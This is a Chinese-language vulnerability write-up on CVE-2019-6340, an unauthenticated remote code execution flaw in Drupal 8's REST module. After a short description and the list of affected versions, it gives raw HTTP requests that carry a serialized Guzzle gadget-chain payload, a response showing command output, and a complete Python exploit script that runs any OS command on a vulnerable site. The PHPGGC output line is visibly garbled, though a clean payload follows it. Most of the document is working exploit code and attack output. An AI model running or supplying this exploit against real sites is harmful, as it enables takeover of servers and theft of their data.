<html><head><meta charset="utf-8" /><style>.pydocx-caps {text-transform:uppercase}.pydocx-center {text-align:center}.pydocx-comment {color:blue}.pydocx-delete {color:red;text-decoration:line-through}.pydocx-hidden {visibility:hidden}.pydocx-insert {color:green}.pydocx-left {text-align:left}.pydocx-list-style-type-cardinalText {list-style-type:decimal}.pydocx-list-style-type-decimal {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedCircle {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedFullstop {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedParen {list-style-type:decimal}.pydocx-list-style-type-decimalZero {list-style-type:decimal-leading-zero}.pydocx-list-style-type-lowerLetter {list-style-type:lower-alpha}.pydocx-list-style-type-lowerRoman {list-style-type:lower-roman}.pydocx-list-style-type-none {list-style-type:none}.pydocx-list-style-type-ordinalText {list-style-type:decimal}.pydocx-list-style-type-upperLetter {list-style-type:upper-alpha}.pydocx-list-style-type-upperRoman {list-style-type:upper-roman}.pydocx-right {text-align:right}.pydocx-small-caps {font-variant:small-caps}.pydocx-strike {text-decoration:line-through}.pydocx-tab {display:inline-block;width:4em}.pydocx-underline {text-decoration:underline}body {margin:0px auto}</style></head><body><h1>（CVE-2019-6340）Drupal 远程代码执行漏洞</h1><h2>一、漏洞简介</h2><p>Drupal Core存在一个远程代码执行漏洞。此次，它的目标是Drupal 8的REST模块，默认情况下，该模块是禁用了，但是该模块在大多数情况下会被用户使用。**该漏洞本质上是由于用户使用Drupal Core RESTful Web Services (rest)时，某些字段类型无法正确清理非格式源中的数据。在某些情况下，这可能导致任意PHP代码执行。**此外，我们发现针对该漏洞提出的即时补救措施是不完整的，这可能会导致一种错误的安全感。<strong>用户可能会根据官方的说明禁用掉RESTful Web Services 中的POST/PATCH方法，但是事实上GET方法也能在无任何权限的情况下执行远程代码，所以用户必须执行Drupal的最新的安全更新或者禁用RESTful Web Services服务，否则网站依旧处于风险当中。</strong></p><h2>二、漏洞影响</h2><p>Drupal 8.6.x &lt; 8.6.10</p><p>Drupal 8.5.x &lt; 8.5.11</p><h2>三、复现过程</h2><p>触发unserialize()</p><p>GET /drupal-8.6.9/node/1?_format=hal_json HTTP/1.1<br />Host: 192.168.1.25<br />Content-Type: application/hal+json<br />Content-Length: 642<br /><br />{<br />  "link": [<br />    {<br />      "value": "link",<br />      "options": "&lt;SERIALIZED_CONTENT&gt;"<br />    }<br />  ],<br />  "_links": {<br />    "type": {<br />      "href": "http://192.168.1.25/drupal-8.6.9/rest/type/shortcut/default"<br />    }<br />  }<br />}</p><p>由于Drupal 8使用<a href="http://docs.guzzlephp.org/en/stable/">Guzzle</a>，我们可以使用PHPGGC生成有效负载：</p><p>$ ./phpggc guzzle / rce1系统ID --json<br /> “ O：24：\” GuzzleHttp \\ Psr7 \\ FnStream \“：2：{s：33：\” \ u0000GuzzleHttp \\ Psr7 \\ FnStream \ u0000methods \“ ; a：1：{s：5：\“ close \”; a：2：{i：0; O：23：\“ GuzzleHttp \\ HandlerStack \”：3：{s：32：\“ \ u0000GuzzleHttp \ \ HandlerStack \ u0000handler \“; s：2：\” id \“; s：30：\” \ u0000GuzzleHttp \\ HandlerStack \ u0000stack \“; a：1：{i：0; a：1：{i：0 ; s：6：\“ system \”;}} s：31：\“ \ u0000GuzzleHttp \\ HandlerStack \ u0000cached \”; b：0;} i：1; s：7：\“ resolve \”;}} s：9：\“ _ fn_close \”; a：2：{i：0; r：4; i：1; s：7：\“ resolve \”;}}“</p><p>我们可以通过get请求发送有效载荷</p><p>GET /drupal-8.6.9/node/1?_format=hal_json HTTP/1.1<br />Host: www.0-sec.org<br />Content-Type: application/hal+json<br />Content-Length: 642<br /><br />{<br />  "link": [<br />    {<br />      "value": "link",<br />      "options": "O:24:\"GuzzleHttp\\Psr7\\FnStream\":2:{s:33:\"\u0000GuzzleHttp\\Psr7\\FnStream\u0000methods\";a:1:{s:5:\"close\";a:2:{i:0;O:23:\"GuzzleHttp\\HandlerStack\":3:{s:32:\"\u0000GuzzleHttp\\HandlerStack\u0000handler\";s:2:\"id\";s:30:\"\u0000GuzzleHttp\\HandlerStack\u0000stack\";a:1:{i:0;a:1:{i:0;s:6:\"system\";}}s:31:\"\u0000GuzzleHttp\\HandlerStack\u0000cached\";b:0;}i:1;s:7:\"resolve\";}}s:9:\"_fn_close\";a:2:{i:0;r:4;i:1;s:7:\"resolve\";}}"<br />    }<br />  ],<br />  "_links": {<br />    "type": {<br />      "href": "http://www.0-sec.org/drupal-8.6.9/rest/type/shortcut/default"<br />    }<br />  }<br />}</p><p>返回值</p><p>HTTP/1.1 200 OK<br />Link: &lt;...&gt;<br />X-Generator: Drupal 8 (https://www.drupal.org)<br />X-Drupal-Cache: MISS<br />Connection: close<br />Content-Type: application/hal+json<br />Content-Length: 9012<br /><br />{...}uid=33(www-data) gid=33(www-data) groups=33(www-data)</p><h3>poc</h3><p>#!/usr/bin/env python3<br /><br /># CVE-2019-6340 Drupal &lt;= 8.6.9 REST services RCE PoC<br /># 2019 @leonjza<br /><br /># Technical details for this exploit is available at:<br />#   https://www.drupal.org/sa-core-2019-003<br />#   https://www.ambionics.io/blog/drupal8-rce<br />#   https://twitter.com/jcran/status/1099206271901798400<br /><br /># Sample usage:<br />#<br /># $ python cve-2019-6340.py http://127.0.0.1/ "ps auxf"<br /># CVE-2019-6340 Drupal 8 REST Services Unauthenticated RCE PoC<br />#  by @leonjza<br />#<br /># References:<br />#  https://www.drupal.org/sa-core-2019-003<br />#  https://www.ambionics.io/blog/drupal8-rce<br />#<br /># [warning] Caching heavily affects reliability of this exploit.<br /># Nodes are used as they are discovered, but once they are done,<br /># you will have to wait for cache expiry.<br />#<br /># Targeting http://127.0.0.1/...<br /># [+] Finding a usable node id...<br /># [x] Node enum found a cached article at: 2, skipping<br /># [x] Node enum found a cached article at: 3, skipping<br /># [+] Using node_id 4<br /># [+] Target appears to be vulnerable!<br />#<br /># USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND<br /># root        49  0.0  0.0   4288   716 pts/0    Ss+  16:38   0:00 sh<br /># root         1  0.0  1.4 390040 30540 ?        Ss   15:20   0:00 apache2 -DFOREGROUND<br /># www-data    24  0.1  2.8 395652 57912 ?        S    15:20   0:08 apache2 -DFOREGROUND<br /># www-data    27  0.1  2.9 396152 61108 ?        S    15:20   0:08 apache2 -DFOREGROUND<br /># www-data    31  0.0  3.4 406304 70408 ?        S    15:22   0:04 apache2 -DFOREGROUND<br /># www-data    39  0.0  2.7 398472 56852 ?        S    16:14   0:02 apache2 -DFOREGROUND<br /># www-data    44  0.2  3.2 402208 66080 ?        S    16:37   0:05 apache2 -DFOREGROUND<br /># www-data    56  0.0  2.6 397988 55060 ?        S    16:38   0:01 apache2 -DFOREGROUND<br /># www-data    65  0.0  2.3 394252 48460 ?        S    16:40   0:01 apache2 -DFOREGROUND<br /># www-data    78  0.0  2.5 400996 51320 ?        S    16:47   0:01 apache2 -DFOREGROUND<br /># www-data   117  0.0  0.0   4288   712 ?        S    17:20   0:00  \_ sh -c echo<br /><br />import sys<br />from urllib.parse import urlparse, urljoin<br /><br />import requests<br /><br /><br />def build_url(*args) -&gt; str:<br />    """<br />        Builds a URL<br />    """<br /><br />    f = ''<br />    for x in args:<br />        f = urljoin(f, x)<br /><br />    return f<br /><br /><br />def uri_valid(x: str) -&gt; bool:<br />    """<br />        https://stackoverflow.com/a/38020041<br />    """<br /><br />    result = urlparse(x)<br />    return all([result.scheme, result.netloc, result.path])<br /><br /><br />def check_drupal_cache(r: requests.Response) -&gt; bool:<br />    """<br />        Check if a response had the cache header.<br />    """<br /><br />    if 'X-Drupal-Cache' in r.headers and r.headers['X-Drupal-Cache'] == 'HIT':<br />        return True<br /><br />    return False<br /><br /><br />def find_article(base: str, f: int = 1, l: int = 100):<br />    """<br />        Find a target article that does not 404 and is not cached<br />    """<br /><br />    while f &lt; l:<br />        u = build_url(base, '/node/', str(f))<br />        r = requests.get(u)<br /><br />        if check_drupal_cache(r):<br />            print(f'[x] Node enum found a cached article at: {f}, skipping')<br />            f += 1<br />            continue<br /><br />        # found an article?<br />        if r.status_code == 200:<br />            return f<br />        f += 1<br /><br /><br />def check(base: str, node_id: int) -&gt; bool:<br />    """<br />        Check if the target is vulnerable.<br />    """<br /><br />    payload = {<br />        "_links": {<br />            "type": {<br />                &quot;href&quot;: f&quot;{urljoin(base, '/rest/type/node/INVALID_VALUE')}&quot;<br />            }<br />        },<br />        "type": {<br />            "target_id": "article"<br />        },<br />        "title": {<br />            "value": "My Article"<br />        },<br />        "body": {<br />            "value": ""<br />        }<br />    }<br /><br />    u = build_url(base, '/node/', str(node_id))<br />    r = requests.get(f'{u}?_format=hal_json', json=payload, headers={&quot;Content-Type&quot;: &quot;application/hal+json&quot;})<br /><br />    if check_drupal_cache(r):<br />        print(f'Checking if node {node_id} is vuln returned cache HIT, ignoring')<br />        return False<br /><br />    if 'INVALID_VALUE does not correspond to an entity on this site' in r.text:<br />        return True<br /><br />    return False<br /><br /><br />def exploit(base: str, node_id: int, cmd: str):<br />    """<br />        Exploit using the Guzzle Gadgets<br />    """<br /><br />    # pad a easy search replace output:<br />    cmd = 'echo ---- &amp; ' + cmd<br />    payload = {<br />        "link": [<br />            {<br />                "value": "link",<br />                "options": "O:24:\"GuzzleHttp\\Psr7\\FnStream\":2:{s:33:\"\u0000"<br />                           "GuzzleHttp\\Psr7\\FnStream\u0000methods\";a:1:{s:5:\""<br />                           "close\";a:2:{i:0;O:23:\"GuzzleHttp\\HandlerStack\":3:"<br />                           "{s:32:\"\u0000GuzzleHttp\\HandlerStack\u0000handler\";"<br />                           "s:|size|:\"|command|\";s:30:\"\u0000GuzzleHttp\\HandlerStack\u0000"<br />                           "stack\";a:1:{i:0;a:1:{i:0;s:6:\"system\";}}s:31:\"\u0000"<br />                           "GuzzleHttp\\HandlerStack\u0000cached\";b:0;}i:1;s:7:\""<br />                           "resolve\";}}s:9:\"_fn_close\";a:2:{i:0;r:4;i:1;s:7:\"resolve\";}}"<br />                           &quot;&quot;.replace('|size|', str(len(cmd))).replace('|command|', cmd)<br />            }<br />        ],<br />        "_links": {<br />            "type": {<br />                &quot;href&quot;: f&quot;{urljoin(base, '/rest/type/shortcut/default')}&quot;<br />            }<br />        }<br />    }<br /><br />    u = build_url(base, '/node/', str(node_id))<br />    r = requests.get(f'{u}?_format=hal_json', json=payload, headers={&quot;Content-Type&quot;: &quot;application/hal+json&quot;})<br /><br />    if check_drupal_cache(r):<br />        print(f'Exploiting {node_id} returned cache HIT, may have failed')<br /><br />    if '----' not in r.text:<br />        print('[warn] Command execution _may_ have failed')<br /><br />    print(r.text.split('----')[1])<br /><br /><br />def main(base: str, cmd: str):<br />    """<br />        Execute an OS command!<br />    """<br /><br />    print('[+] Finding a usable node id...')<br />    article = find_article(base)<br />    if not article:<br />        print('[!] Unable to find a node ID to reference. Check manually?')<br />        return<br /><br />    print(f'[+] Using node_id {article}')<br /><br />    vuln = check(base, article)<br />    if not vuln:<br />        print('[!] Target does not appear to be vulnerable.')<br />        print('[!] It may also simply be a caching issue, so maybe just try again later.')<br />        return<br />    print(f'[+] Target appears to be vulnerable!')<br /><br />    exploit(base, article, cmd)<br /><br /><br />if __name__ == '__main__':<br /><br />    print('CVE-2019-6340 Drupal 8 REST Services Unauthenticated RCE PoC')<br />    print(' by @leonjza\n')<br />    print('References:\n'<br />          ' https://www.drupal.org/sa-core-2019-003\n'<br />          ' https://www.ambionics.io/blog/drupal8-rce\n')<br />    print('[warning] Caching heavily affects reliability of this exploit.\n'<br />          'Nodes are used as they are discovered, but once they are done,\n'<br />          'you will have to wait for cache expiry.\n')<br /><br />    if len(sys.argv) &lt;= 2:<br />        print(f'Usage: {sys.argv[0]} &lt;target base URL&gt; &lt;command&gt;')<br />        print(f'    Example: {sys.argv[0]} http://127.0.0.1/ id')<br /><br />    target = sys.argv[1]<br />    command = sys.argv[2]<br />    if not uri_valid(target):<br />        print(f'Target {target} is not a valid URL')<br />        sys.exit(1)<br /><br />    print(f'Targeting {target}...')<br />    main(target, command)</p></body></html>